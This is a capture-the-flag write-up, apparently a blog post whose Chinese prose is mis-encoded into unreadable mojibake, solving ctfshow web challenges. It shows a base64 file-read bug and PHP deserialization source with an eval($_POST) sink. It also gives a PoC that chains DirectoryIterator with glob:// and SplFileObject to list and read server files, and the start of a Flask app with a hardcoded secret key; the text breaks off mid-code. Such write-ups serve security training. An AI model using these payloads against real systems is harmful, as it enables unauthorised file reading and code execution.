        <content type="html"><![CDATA[<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230404104706716.png" alt="image-20230404104706716"></p><p>ä¸€ä¸ªè¡¨æƒ…åŒ…ï¼Œç„¶åurlåé¢è¿˜è·Ÿç€ä¸€æ®µbase64ç¼–ç çš„å†…å®¹ï¼Œè§£ç åæŸ¥çœ‹æ—¶<strong>face.png</strong>ï¼Œæ‰€ä»¥æ„Ÿè§‰è¿™é‡Œå­˜åœ¨<strong>æ–‡ä»¶åŒ…å«æˆ–è€…æ–‡ä»¶æŸ¥è¯¢</strong></p><p>ç„¶åå°±å»æŸ¥è¯¢<code>index.php</code>,ç„¶åå°±æŸ¥çœ‹æºç å‘ç°äº†ä¸€æ®µbase64ç¼–ç çš„å†…å®¹ï¼Œç„¶åæ‹¿å»è§£ç </p><p><strong>è§£ç åçš„ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;3ae89687-0319-4fdd-8d58-4910ede71b51&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="è¢«é—å¿˜çš„ååºåˆ—åŒ–"><a href="#è¢«é—å¿˜çš„ååºåˆ—åŒ–" class="headerlink" title="è¢«é—å¿˜çš„ååºåˆ—åŒ–"></a>è¢«é—å¿˜çš„ååºåˆ—åŒ–</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä¸è¡Œå“¦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure><p>è¿™é¢˜è€ƒå¯Ÿçš„å°±æ˜¯åŸç”Ÿç±»çš„åšæ³•</p><p><strong>å®ç°äº†serializableæ¥å£çš„å†…ç½®ç±»å°±æ˜¯cå¼€å¤´çš„</strong></p><p><a href="https://blog.csdn.net/JSPSEO/article/details/125135112">æ·±å…¥äº†è§£PHPååºåˆ—åŒ–åŸç”Ÿç±»</a></p><p><a href="https://blog.csdn.net/weixin_61956136/article/details/125705264">webå®‰å…¨-PHPååºåˆ—åŒ–æ¼æ´</a></p><p><img src="../images/image-20230404113117742.png" alt="image-20230404113117742"></p><p>æœ¬é¢˜å°±æ˜¯ç”¨è¿™ä¸ªå†…ç½®ç±»æ¥è§£é¢˜çš„</p><p>é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°æœ€ä¸‹é¢è¿™é‡Œæ˜¯$ip = $SERVER[â€œHTTP_AAAAAAâ€]; è¿™ä¸€å¥è¯çš„æ„æ€æ˜¯æ¥æ”¶headerå¤´ä¸­ aaaaaaå‚æ•°çš„å€¼ï¼Œç„¶åå°†å…¶ååºåˆ—åŒ–ã€‚ ç„¶åæ ¹æ®æç¤ºåœ¨æ ¹ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“ä»–çš„æ–‡ä»¶åå­—æ˜¯ä»€ä¹ˆã€‚</p><p><img src="../images/image-20230404114042321.png" alt="image-20230404114042321"></p><p><strong>è¿™é‡Œä¼ aaaaaæ˜¯å› ä¸ºè¿™ä¸ªç©æ„å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæœ¬åœ°æµ‹è¯•è¿‡äº†</strong></p><p><img src="../images/image-20230404115608848.png" alt="image-20230404115608848"></p><p>è¿™é‡Œçš„æ ¼å¼å°±æ˜¯å’Œä¸Šé¢çš„å†…ç½®ç±»æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”<strong>coos</strong>å’Œ<strong>file</strong>è¿˜å¯æ§æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç›´æ¥æŸ¥ä¸Šé¢ç»™çš„<strong>txt</strong>æ–‡ä»¶</p><p><strong>éé¢„æœŸ</strong></p><p><a href="https://blog.csdn.net/qq_46570234/article/details/129928356?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168059578216800227488263%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168059578216800227488263&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-129928356-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4187">éé¢„æœŸwp</a></p><p>è¿™é‡Œå°±æ˜¯åªç”¨åˆ°äº†ä¸¤ä¸ªç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä¸è¡Œå“¦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åªç”¨åˆ°ä¸¤ä¸ªç±»ï¼Œå°±æ˜¯ä¸€ä¸ªç±»ç”¨è·å–æ–‡ä»¶åï¼Œä¸€ä¸ªç”¨æ¥è·å–flagçš„å€¼</p><p>æˆ‘ä»¬çŸ¥é“åœ¨phpä¸­æ”¯æŒä½¿ç”¨<code>$a($b)</code>è¿™æ ·åŠ¨æ€çš„å½¢å¼è°ƒç”¨å‡½æ•°/å®ä¾‹åŒ–ï¼Œ</p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™ä¸€è¡Œå°±æ˜¯è¿™æ ·çš„å½¢å¼ï¼š<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p><strong>å¯éå†ç›®å½•ç±»æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator ç±»</span><br><span class="line">FilesystemIterator ç±»</span><br><span class="line">GlobIterator ç±»</span><br></pre></td></tr></table></figure><p><strong>å¯è¯»å–æ–‡ä»¶ç±»æœ‰ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject ç±»</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ç”¨å†…ç½®ç±»æ¥éå†ç›®å½•ï¼Œç„¶åè¯»å–æ–‡ä»¶</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>åˆ†ä¸¤æ­¥èµ°ï¼Œç¬¬ä¸€æ­¥ï¼Œè¯»å–æ–‡ä»¶å</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#ä½¿ç”¨globåæ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ è¿™é‡Œ/*f*åŒ¹é…äº†æ ¹ç›®å½•ä¸‹åŒ…å«fçš„æ–‡ä»¶å¤¹å</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163706592.png" alt="image-20230404163706592"></p><p>è¯»å–åˆ°äº†æ–‡ä»¶åï¼Œç„¶åæˆ‘ä»¬å°±ç”¨å¦ä¸€ä¸ªå†…ç½®ç±»æ¥è¯»å–æ–‡ä»¶å†…å®¹</p><p><strong>ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨<code>SplFileObject</code>ç±»è¯»å–æ–‡ä»¶å†…å®¹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163852169.png" alt="image-20230404163852169"></p><p>æœ€åæ‹¿åˆ°flag</p><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230404164641841.png" alt="image-20230404164641841"></p><p><strong>è€ƒç‚¹</strong></p><p><strong>flaskçš„sessionä¼ªé€   +  ä»»æ„æ–‡ä»¶ä¸‹è½½  +  pythonå‘½ä»¤æ‰§è¡Œ</strong></p><p>è¿™é‡Œæ³¨å†Œçš„æ—¶å€™å°è¯•ä½¿ç”¨adminè´¦æˆ·æ³¨å†Œï¼Œç„¶åå‘ç°äº†è¿™ä¸ªè´¦æˆ·å­˜åœ¨ï¼Œç„¶åå°±æ³¨å†Œä¸ªå…¶ä»–è´¦æˆ·è¿›è¡Œç™»å½•æŸ¥çœ‹</p><p><img src="../images/image-20230404164920975.png" alt="image-20230404164920975"></p><p>è¿™é‡Œçš„è¯åº”è¯¥è¦æˆä¸ºç®¡ç†å‘˜æ‰èƒ½è¿›è¡Œè·å–flag</p><p>ç„¶åç‚¹å‡»learn</p><p><img src="../images/image-20230404165019779.png" alt="image-20230404165019779"></p><p>çœ‹åˆ°äº†ä¸€äº›ä»£ç ï¼Œè¿™é‡Œæˆ‘çœ‹åˆ°çµ¦keyçš„æ—¶å€™ï¼Œæˆ‘å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯è€ƒçš„æ˜¯<strong>sessionä¼ªé€ æˆ–åˆ™æ˜¯pythonååºåˆ—åŒ–</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span 